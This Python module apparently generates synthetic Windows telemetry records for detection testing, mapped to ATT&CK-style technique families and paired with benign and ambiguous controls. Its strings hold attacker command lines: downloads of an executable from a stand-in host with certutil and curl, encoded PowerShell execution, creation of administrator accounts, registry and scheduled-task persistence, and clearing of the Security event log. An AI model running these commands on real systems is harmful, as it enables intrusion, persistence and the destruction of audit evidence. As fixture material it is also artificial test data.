"""Concrete realizations of approved family behaviors; strings are never executed.

Resource/argument variation changes operational targets within each approved
behavior. IDs, timestamps, hashes and hostnames are not used to evade duplicates.
"""

import base64
from xml.sax.saxutils import escape


SYSTEM = r"C:\Windows\System32"
POWERSHELL = SYSTEM + r"\WindowsPowerShell\v1.0\powershell.exe"
PWSH = r"C:\Program Files\PowerShell\7\pwsh.exe"


def proc(image, command=None, parent=None, user=None):
    if command and " " in image and command.startswith(image):
        command = '"' + image + '"' + command[len(image):]
    values = {"Image": image, "CommandLine": command or image}
    if parent: values["ParentImage"] = parent
    if user: values["User"] = user
    return values


def task(name, executable, arguments="", hidden=False, working_directory=None, trigger="BootTrigger"):
    xml = ('<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
           f'<Triggers><{trigger}><Enabled>true</Enabled></{trigger}></Triggers>'
           f'<Settings><Hidden>{str(hidden).lower()}</Hidden></Settings>'
           '<Actions><Exec><Command>' + escape(executable) + '</Command><Arguments>'
           + escape(arguments) + '</Arguments>'
           + ('<WorkingDirectory>' + escape(working_directory) + '</WorkingDirectory>' if working_directory else '')
           + '</Exec></Actions></Task>')
    return {"TaskName": name, "TaskContent": xml}


def realize_family(fid, v):
    """Return registry-keyed field recipes and chronological keys for one instance."""
    name, user, ip = v["resource"], v["user"], v["ip"]
    pd = rf"C:\ProgramData\{name}"
    public = rf"C:\Users\Public\{name}"
    app = rf"C:\Users\{user}\AppData\Local\{name}"
    exe, script, dll, bat = pd + r"\agent.exe", public + r"\run.ps1", public + r"\cache.dll", public + r"\stage.bat"
    url = f"https://files.example.invalid/{name}/package.exe"
    encoded = base64.b64encode(f"Write-Output '{name}'".encode("utf-16-le")).decode()
    cmd, ps, pwsh = SYSTEM + r"\cmd.exe", POWERSHELL, PWSH
    explorer, services, taskeng = r"C:\Windows\explorer.exe", SYSTEM + r"\services.exe", SYSTEM + r"\taskeng.exe"
    a, c, d = {}, {}, {}
    order = ["anchor", "context_1"]

    if fid.startswith("TF_T1059_001_"):
        kind = fid.rsplit("_", 1)[1]
        if kind == "A":
            parent = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
            a = proc(ps, f'{ps} -NoProfile -EncodedCommand {encoded}', parent)
            c = proc(parent, f'"{parent}" "{public}\\agenda.docx"', explorer)
            order = ["context_1", "anchor"]
        elif kind == "C":
            parent = SYSTEM + r"\wbem\WmiPrvSE.exe"
            a = proc(ps, f'{ps} -NoProfile -File "{script}"', parent)
            c = {"Image": parent, "DestinationPort": 135, "DestinationIp": ip}
            order = ["context_1", "anchor"]
        elif kind == "E":
            a = proc(ps, f'{ps} -Command "Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\'{encoded}\')))"')
            c = {"Image": ps, "DestinationIp": ip}
        elif kind == "F":
            source = f'public class Loader {{public static void Run() {{System.Reflection.Assembly.Load(System.IO.File.ReadAllBytes(@"{dll}"));}}}}'
            a = proc(ps, f'{ps} -Command "Add-Type -TypeDefinition \'{source}\'; [Loader]::Run()"')
            c = {"Image": ps, "DestinationIp": ip}
        elif kind == "DEV":
            a = proc(pwsh, f'{pwsh} -EncodedCommand {encoded}', SYSTEM + r"\wscript.exe")
            c = {"Image": pwsh, "DestinationIp": ip}
    elif fid.startswith("TF_T1059_003_"):
        kind = fid.rsplit("_", 1)[1]
        if kind == "A":
            out = pd + r"\inventory.txt"
            a = proc(cmd, f'{cmd} /c whoami /all && hostname > {out}', explorer)
            c = proc(SYSTEM + r"\whoami.exe", f'whoami /all', cmd)
        elif kind == "B":
            a = proc(cmd, f'{cmd} /c certutil -urlcache -split -f {url} {exe}', services)
            c = {"Image": SYSTEM + r"\certutil.exe", "TargetFilename": exe}
        elif kind == "C":
            a = proc(cmd, f'{cmd} /v:on /c "{bat}"', explorer)
            c = {"Image": explorer, "TargetFilename": bat}
            order = ["context_1", "anchor"]
        elif kind == "E":
            out = pd + r"\services.txt"
            a = proc(cmd, f'{cmd} /c tasklist | findstr /i service > {out}')
            c = {"Image": cmd, "TargetFilename": out}
        elif kind == "DEV":
            a = proc(cmd, f'{cmd} /v:on /c call "{bat}"', SYSTEM + r"\mshta.exe")
            c = proc(cmd, f'{cmd} /c echo {name}', cmd)
    elif fid.startswith("TF_T1053_005_"):
        kind = fid.rsplit("_", 1)[1]
        if kind == "A":
            args = f'-EncodedCommand {encoded}'
            a = task(r"\Windows\UpdateCheck_" + name, ps, args, True, working_directory=public)
            c = proc(ps, ps + ' ' + args, taskeng)
        elif kind == "B":
            a = task(r"\CacheRefresh_" + name, exe)
            c = proc(exe, exe, taskeng)
        elif kind in {"D", "DEV"}:
            executable = SYSTEM + r"\rundll32.exe"
            target = dll if kind == "D" else pd + r"\session.dll"
            a = task((r"\OneDriveUpdate_" if kind == "D" else r"\SessionTelemetry_") + name, executable, target + ',Entry', True, trigger="BootTrigger" if kind == "D" else "LogonTrigger")
            c = proc(executable, executable + ' ' + target + ',Entry', taskeng)
        elif kind == "E":
            a = task(r"\ScriptRefresh_" + name, ps, f'-File "{script}"')
            c = proc(ps, f'{ps} -File "{script}"', taskeng)
            d = {"Image": ps, "DestinationIp": ip, "DestinationPort": 443}
            order += ["context_2"]
    elif fid.startswith("TF_T1543_003_"):
        kind = fid.rsplit("_", 1)[1]
        a = {"ServiceName": "Update_" + name, "ServiceAccount": "LocalSystem", "ServiceStartType": "2"}
        if kind == "A":
            a["ServiceFileName"] = public + r"\service.exe"
            a["SubjectUserName"] = "SYSTEM"
            c = proc(services, services, SYSTEM + r"\wininit.exe", "SYSTEM")
            order = ["context_1", "anchor"]
        elif kind == "B":
            a["ServiceFileName"] = f'{cmd} /c "{exe}"'
            c = proc(cmd, a["ServiceFileName"], services, "SYSTEM")
        else:
            # The approved registry explicitly records ServiceDll in the service
            # image string; keep that synthetic declaration visible and scoped.
            folder = public if kind == "D" else pd
            a["ServiceFileName"] = SYSTEM + rf"\svchost.exe -k {name} -s Update_{name} ServiceDll={folder}\service.dll"
            a["ServiceAccount"] = "LocalService" if kind == "DEV" else "LocalSystem"
            c = {"Image": SYSTEM + r"\msiexec.exe", "TargetFilename": folder + r"\service.dll"}
            order = ["context_1", "anchor"]
            if kind == "E":
                d = proc(SYSTEM + r"\svchost.exe", a["ServiceFileName"], services, "SYSTEM")
                order += ["context_2"]
    elif fid.startswith("TF_T1136_001_"):
        kind = fid.rsplit("_", 1)[1]
        account = "svc_" + name.rsplit("_", 1)[-1]
        if kind == "A":
            account += '$'
            a = proc(cmd, f'{cmd} /c net user {account} ExamplePassword! /add /expires:never')
            c = {"TargetUserName": account}
        elif kind in {"C", "DEV"}:
            a = proc(pwsh, f'{pwsh} -Command "New-LocalUser -Name {account} -AccountNeverExpires -Description {name}"')
            c = {"TargetUserName": account}
        else:
            account = "backup_" + name.rsplit("_", 1)[-1] if kind == "E" else account
            actor = "helpdesk" if kind == "E" else user
            a = {"TargetUserName": account, "SubjectUserName": actor}
            c = proc(cmd, f'{cmd} /c net localgroup administrators {account} /add', user=actor)
    elif fid.startswith("TF_T1547_001_"):
        kind = fid.rsplit("_", 1)[1]
        if kind == "A":
            target = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run" + chr(92) + name
            payload = public + r"\agent.exe"
            a = {"Image": SYSTEM + r"\reg.exe", "TargetObject": target, "Details": payload}
            key = target.rsplit(chr(92), 1)[0]
            c = proc(SYSTEM + r"\reg.exe", f'reg.exe add "{key}" /v {name} /t REG_SZ /d "{payload}" /f')
            order = ["context_1", "anchor"]
        elif kind in {"B", "DEV"}:
            executable = explorer if kind == "B" else pd + r"\loginhelper.exe"
            suffix = ".lnk" if kind == "B" else ".url"
            a = {"Image": executable, "TargetFilename": rf"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{name}{suffix}"}
            c = proc(executable, executable if kind == "B" else executable + f' /startup {name}', SYSTEM + r"\userinit.exe" if kind == "B" else explorer)
            if kind == "DEV": order = ["context_1", "anchor"]
        elif kind == "C":
            a = {"Image": ps, "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" + chr(92) + name, "Details": script}
            c = {"Image": ps, "TargetFilename": script}
            order = ["context_1", "anchor"]
        elif kind == "E":
            payload = app + r"\helper.exe"
            a = {"Image": SYSTEM + r"\reg.exe", "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" + chr(92) + name, "Details": payload}
            c = {"Image": explorer, "TargetFilename": payload}
            d = proc(payload, payload, explorer)
            order = ["context_1", "anchor", "context_2"]
    elif fid.startswith("TF_T1685_005_"):
        kind = fid.rsplit("_", 1)[1]
        a = {}
        if kind == "A": c = proc(SYSTEM + r"\wevtutil.exe", f'wevtutil.exe cl Security /bu:{pd}\\security.evtx')
        elif kind in {"B", "DEV"}: c = proc(ps, f'{ps} -Command "Clear-EventLog -LogName Security; Write-Output {name}"', SYSTEM + r"\wsmprovhost.exe" if kind == "DEV" else cmd)
        elif kind == "C": c = proc(pd + r"\loghelper.exe", f'{pd}\\loghelper.exe --api EvtClearLog --channel Security --archive {pd}\\security.evtx')
        elif kind == "E":
            c = {"Image": SYSTEM + r"\svchost.exe", "DestinationIp": ip, "DestinationPort": 445}
            d = proc(SYSTEM + r"\wevtutil.exe", f'wevtutil.exe cl Security /bu:{pd}\\security.evtx')
            order = ["context_1", "context_2", "anchor"]
        if kind != "E": order = ["context_1", "anchor"]
    elif fid.startswith("TF_T1105_"):
        kind = fid.rsplit("_", 1)[1]
        if kind in {"A", "B", "C"}:
            executable = SYSTEM + {"A":r"\certutil.exe", "B":r"\bitsadmin.exe", "C":r"\curl.exe"}[kind]
            args = {"A":f'-urlcache -split -f {url} {exe}', "B":f'/transfer {name} {url} {exe}', "C":f'{url} -o {exe}'}[kind]
            a = proc(executable, executable + ' ' + args)
            c = {"Image": executable, "TargetFilename": exe}
        elif kind == "D":
            executable = SYSTEM + r"\curl.exe"
            a = {"Image": executable, "DestinationIp": v["limited_ip"], "DestinationPort": 443}
            c = proc(executable, f'{executable} {url} -o {exe}')
            d = {"Image": executable, "TargetFilename": exe}
            order = ["context_1", "anchor", "context_2"]
        elif kind == "DEV":
            a = proc(SYSTEM + r"\msiexec.exe", f'msiexec.exe /i https://files.example.invalid/{name}/setup.msi /qn')
            c = {"Image": SYSTEM + r"\msiexec.exe", "TargetFilename": pd + r"\setup.msi"}
    elif fid == "TF_MULTI_A":
        a = proc(ps, f'{ps} -Command "Invoke-WebRequest {url} -OutFile {exe}; Register-ScheduledTask -TaskName CacheRefresh_{name} -Action (New-ScheduledTaskAction -Execute {exe})"')
        c = {"Image": ps, "TargetFilename": exe}
        d = task(r"\CacheRefresh_" + name, exe)
        order += ["context_2"]
    elif fid == "TF_MULTI_B":
        a = {"ServiceName": "Update_" + name, "ServiceFileName": public + r"\agent.exe", "ServiceAccount": "LocalSystem"}
        c = proc(cmd, f'{cmd} /c sc create Update_{name} binPath= {public}\\agent.exe && wevtutil cl Security /bu:{pd}\\audit.evtx')
        d = {}
        order = ["context_1", "anchor", "context_2"]
    elif fid == "TF_MULTI_C":
        account = "svc_" + name.rsplit("_", 1)[-1]
        a = {"TargetUserName": account}
        c = {"Image": SYSTEM + r"\reg.exe", "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run" + chr(92) + name, "Details": rf"C:\Users\{account}\AppData\Local\agent.exe"}
    elif fid == "TF_MULTI_D":
        a = proc(cmd, f'{cmd} /c curl {url} -o {exe} && {exe}')
        c = {"Image": SYSTEM + r"\curl.exe", "TargetFilename": exe}
    elif fid == "TF_MULTI_DEV_A":
        payload = pd + r"\DEV\agent.exe"
        a = {"TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run" + chr(92) + name, "Details": payload}
        c = {"ServiceName": "Update_" + name, "ServiceFileName": payload, "ServiceAccount": "LocalService"}
    elif fid == "TF_MULTI_DEV_B":
        out = pd + r"\DEV\cache\package.exe"
        args = f'-File "{script}" -Source {url} -Destination {out}'
        a = task(r"\DEV\PackageRefresh_" + name, pwsh, args)
        c = proc(pwsh, pwsh + ' ' + args, taskeng)
        d = {"Image": pwsh, "TargetFilename": out}
        order += ["context_2"]
    elif fid.startswith("TF_UNMAP_"):
        kind = fid[len("TF_UNMAP_"):]
        if kind in {"A", "PS"}:
            args = f'-NoProfile -File "{pd}\\run.ps1" -Resource {name}' if kind == "A" else f'-NoProfile -Command "Get-Service -Name {name}"'
            a = proc(ps, ps + ' ' + args, taskeng)
            c = proc(taskeng, taskeng, SYSTEM + r"\svchost.exe")
            order = ["context_1", "anchor"]
        elif kind in {"B", "CMD"}:
            args = f'/c ipconfig /flushdns && nslookup {name}.example.invalid' if kind == "B" else f'/c dir {pd}'
            a = proc(cmd, cmd + ' ' + args, explorer, "helpdesk")
            c = proc(SYSTEM + r"\ipconfig.exe", f'ipconfig /flushdns', cmd, "helpdesk") if kind == "B" else proc(explorer, f'{explorer} /select,{pd}', user="helpdesk")
            if kind == "CMD": order = ["context_1", "anchor"]
        elif kind in {"C", "SCHTASK"}:
            executable = SYSTEM + r"\cleanmgr.exe" if kind == "C" else pd + r"\updater.exe"
            taskname = r"\Microsoft\Windows\DiskCleanup_" if kind == "C" else r"\UpdateCheck_"
            args = f'/sagerun:{v["job_number"]}' if kind == "C" else f'--package {name}'
            a = {**task(taskname + name, executable, args), "SubjectUserName": "SYSTEM"}
            c = proc(executable, executable + ' ' + args, taskeng, "SYSTEM")
        elif kind == "D":
            executable = pd + r"\agent.exe"
            a = {"ServiceName": "Agent_" + name, "ServiceFileName": executable + f' --instance {name}', "ServiceAccount": "LocalSystem", "ServiceStartType": "2", "SubjectUserName": "Administrator"}
            c = proc(executable, executable + f' --instance {name}', services, "SYSTEM")
        elif kind == "E":
            a = {"TargetUserName": "jdoe", "SubjectUserName": "helpdesk"}
            c = proc(SYSTEM + r"\net.exe", f'net user jdoe /add /fullname:"{name}" /comment:"Employee onboarding {name}"', r"C:\ProgramData\IAM\Provisioner.exe", "helpdesk")
            order = ["context_1", "anchor"]
        elif kind == "SVC":
            a = {"ServiceName": "PatchService_" + name, "ServiceFileName": pd + r"\patch.exe" + f' --package {name}', "ServiceAccount": "LocalService"}
            c = proc(SYSTEM + r"\msiexec.exe", f'msiexec.exe /i C:\\Packages\\{name}\\PatchService.msi /qn', r"C:\Windows\CCM\CcmExec.exe")
            order = ["context_1", "anchor"]
        elif kind == "ACCT":
            a = {"TargetUserName": "backupsvc", "SubjectUserName": "Administrator"}
            executable = r"C:\ProgramData\IAM\account-provisioner.exe"
            c = proc(executable, executable + f' --create backupsvc --role backup --scope {name}', r"C:\ProgramData\IAM\management-agent.exe", "Administrator")
            order = ["context_1", "anchor"]
        elif kind == "REG":
            executable = r"C:\Program Files\OneDrive\OneDrive.exe"
            a = {"Image": executable, "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive_" + name, "Details": executable + f' /profile {name}'}
            c = proc(executable, executable + f' /profile {name}', explorer)
            order = ["context_1", "anchor"]
        elif kind == "EVTCLR":
            executable = pd + r"\logrotate.exe"
            a = {"SubjectUserName": "SYSTEM"}
            c = {**task(r"\LogRetention_" + name, executable, f'--clear Security --archive {pd}\\retention.evtx'), "SubjectUserName": "SYSTEM"}
            d = proc(executable, executable + f' --clear Security --archive {pd}\\retention.evtx', taskeng, "SYSTEM")
            order = ["context_1", "context_2", "anchor"]
        elif kind == "DEV":
            executable = pd + r"\updater.exe"
            a = {"Image": executable, "DestinationIp": v["limited_ip"]}
            c = {"Image": executable, "TargetFilename": pd + rf"\Cache\{name}.dat"}
    elif fid.startswith("TF_AMBIG_"):
        kind = fid[len("TF_AMBIG_"):]
        if kind == "A":
            a = proc(ps, f'{ps} -File {public}\\unknown.ps1')
            c = proc(ps, f'{ps} -File {public}\\unknown.ps1 -Mode {v["mode"]}')
        elif kind == "B":
            a = proc(cmd, f'{cmd} /c whoami /{v["whoami_flag"]}')
            c = proc(cmd, f'{cmd} /c whoami /{v["whoami_flag"]} /fo {v["format"]} > {app}\\identity.txt')
        elif kind == "C":
            a = task(r"\CacheRefresh_" + name, pd + r"\cache.exe")
            c = task(r"\CacheRefreshNext_" + name, pd + r"\cache.exe", f'--job {name}')
        elif kind == "D":
            a = {"TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" + chr(92) + name, "Details": app + r"\helper.exe"}
            c = {"TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Next_" + name, "Details": app + r"\helper.exe"}
        elif kind == "DEV":
            a = {"ServiceName": "Telemetry_" + name, "ServiceFileName": exe, "ServiceStartType": "3"}
            c = {"ServiceName": "TelemetryNext_" + name, "ServiceFileName": exe, "ServiceStartType": "3"}
    else:
        raise ValueError(f"No concrete realization for approved family {fid}")
    return {"anchor": a, "context_1": c, "context_2": d}, order
